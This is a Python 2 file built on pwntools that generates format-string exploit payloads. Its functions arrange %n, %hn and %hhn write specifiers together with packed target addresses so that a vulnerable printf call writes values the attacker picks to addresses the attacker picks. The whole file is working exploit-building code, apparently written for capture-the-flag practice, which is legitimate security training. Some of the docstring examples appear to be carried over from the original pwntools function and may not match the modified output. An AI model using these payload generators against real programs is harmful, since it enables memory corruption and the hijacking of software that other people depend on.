
#import logging

#from pwnlib.log import getLogger
#from pwnlib.util.packing import *

from pwn import *

log = getLogger(__name__)

# just the same as fmtstr_payload with pwntools, but put address list behind the format string.
def fmtstr_payload(offset, writes, write_size='byte',numbwritten=0):
    r"""fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str

    Makes payload with given parameter.
    It can generate payload for 32 or 64 bits architectures.
    The size of the addr is taken from ``context.bits``

    Arguments:
        offset(int): the first formatter's offset you control
        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
        numbwritten(int): number of byte already written by the printf function
        write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
    Returns:
        The payload in order to do needed writes

    Examples:
        >>> context.clear(arch = 'amd64')
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
        '\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
        '\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
        '\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
        >>> context.clear(arch = 'i386')
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
        '\x00\x00\x00\x00%322419386c%1$n'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
        '\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
        '\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'

    """

    # 'byte': (number, step, mask, format, decalage)
    config = {
        32 : {
            'byte': (4, 1, 0xFF, 'hh', 8),
            'short': (2, 2, 0xFFFF, 'h', 16),
            'int': (1, 4, 0xFFFFFFFF, '', 32)},
        64 : {
            'byte': (8, 1, 0xFF, 'hh', 8),
            'short': (4, 2, 0xFFFF, 'h', 16),
            'int': (2, 4, 0xFFFFFFFF, '', 32)
        }
    }

    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    number, step, mask, formatz, decalage = config[context.bits][write_size]

    # add wheres
    payload = ""
    for where, what in writes.items():
        for i in range(0, number*step, step):
            payload += pack(where+i)


    #numbwritten = 0
    saved_num=numbwritten
    fmtCount = 0
    tmp_payload=""
    for where, what in writes.items():
        for i in range(0, number):
            current = what & mask
            if numbwritten & mask <= current:
                to_add = current - (numbwritten & mask)
            else:
                to_add = (current | (mask+1)) - (numbwritten & mask)
            if to_add != 0:
                tmp_payload += "%{}c".format(to_add)
            tmp_payload += "%{}${}n".format(offset + fmtCount, formatz)

            numbwritten += to_add
            what >>= decalage
            fmtCount += 1

    padlen=8-(len(tmp_payload)%8)
    padlen+=0x10
    tmp_payload+='a'*padlen
    payload_len=len(tmp_payload)


    fmtCount=len(tmp_payload)/(context.bits/8)
    numbwritten = saved_num
    payload=""
    for where, what in writes.items():
        for i in range(0, number):
            current = what & mask
            if numbwritten & mask <= current:
                to_add = current - (numbwritten & mask)
            else:
                to_add = (current | (mask+1)) - (numbwritten & mask)

            if to_add != 0:
                payload += "%{}c".format(to_add)
            payload += "%{}${}n".format(offset + fmtCount, formatz)

            numbwritten += to_add
            what >>= decalage
            fmtCount += 1

    payload=payload.ljust(payload_len,'\x00')

    for where, what in writes.items():
        for i in range(0, number*step, step):
            payload += pack(where+i)



    
    return payload


# 4bytes write per step, offset should be the index of memory which you can control, and write_payload should be a dict which is address:value pair, it will return all the fromat string including the addr list.
def fmtstr_hn_complete(offset,write_payload):
    #print write_payload
    addr_list=[]
    value_dict={}
    i=0
    for addr, what in write_payload.items():
        print hex(addr),hex(what)
        addr_list.append(addr)
        value_dict[i]=what
        i+=1

    tmp_printed = 0
    tmp_payload = ''
    index=offset
    #print value_dict.items()
    #print sorted(value_dict.items(), key=operator.itemgetter(1))
    for where, what in sorted(value_dict.items(), key=operator.itemgetter(1)):
        delta = (what - tmp_printed) & 0xffff
        if delta > 0:
            if delta < 8:
                tmp_payload += 'A' * delta
            else:
                tmp_payload += '%' + str(delta) + 'x'
        tmp_payload += '%' + str(index + where) + '$hn'
        tmp_printed += delta

    padlen=8-(len(tmp_payload)%8)
    padlen+=0x8
    tmp_payload+='a'*padlen
    payload_len=len(tmp_payload)

    index=offset+payload_len/(context.bits/8)
    payload=''
    printed=0

    for where, what in sorted(value_dict.items(), key=operator.itemgetter(1)):
        delta = (what - printed) & 0xffff
        if delta > 0:
            if delta < 8:
                payload += 'A' * delta
            else:
                payload += '%' + str(delta) + 'x'
        payload += '%' + str(index + where) + '$hn'
        printed += delta
    payload=payload.ljust(payload_len,'a')

    for i in addr_list:
        payload+=pack(i)
    return payload

# 4bytes write per step. offset should be the index of addr_start and write_payload should be a dict which is a address:value pair. it will return the payload of format string not included the addr list. you need to add it munally.
def fmtstr_hn_payload(offset,write_payload):
    
    addr_list=[]
    value_dict={}
    i=0
    for addr, what in write_payload.items():
        print hex(addr),hex(what)
        addr_list.append(addr)
        value_dict[i]=what
        i+=1

    printed = 0
    payload = ''
    #print writes.items()
    #print sorted(writes.items(), key=operator.itemgetter(1))
    for where, what in sorted(value_dict.items(), key=operator.itemgetter(1)):
        delta = (what - printed) & 0xffff
        if delta > 0:
            if delta < 8:
                payload += 'A' * delta
            else:
                payload += '%' + str(delta) + 'x'
        payload += '%' + str(offset + where) + '$hn'
        printed += delta


    return payload

